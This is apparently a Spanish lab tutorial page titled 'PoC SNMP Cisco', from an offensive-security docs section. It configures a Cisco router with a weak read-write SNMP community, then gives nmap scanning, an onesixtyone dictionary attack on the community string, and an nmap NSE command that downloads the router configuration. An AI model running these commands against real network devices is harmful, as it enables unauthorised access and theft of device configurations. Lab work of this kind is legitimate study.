---
theme: "just-the-docs"
title: "PoC SNMP Cisco"
layout: default
nav_order: 16
parent: "Seguridad Ofensiva"
---
# PoC SNMP Cisco
## Configuracion de router Cisco
```
int fa0/0
 no shutdown
 ip address dhcp
username lesand password lesand2024
enable secret lesand2024
snmp-server community lesand2024 rw
end
copy running-config startup-config
```
```
show ip int brief | inc DHCP
```
## Verificacion de Puerto de SNMP
```
sudo nmap -sU -sV -p 161 192.168.85.137
```
## Creacion de listado de IPs
```
cd /home/lesand/Desktop/tools/diccionarios  
echo -e "192.168.85.137" > IPs.txt
```
## Ataque de diccionario SNMP.
```
onesixtyone -c dicc.txt -i IPs.txt -o snmp-one.txt
cat snmp.txt
```
## Descarga de configuraciones de SNMP con NSE de NMAP
```
sudo nmap -sU -p 161 --script snmp-ios-config --script-args creds.snmp=:lesand2024 192.168.85.137 -oN snmp-nmap.txt 192.168.85.137
```
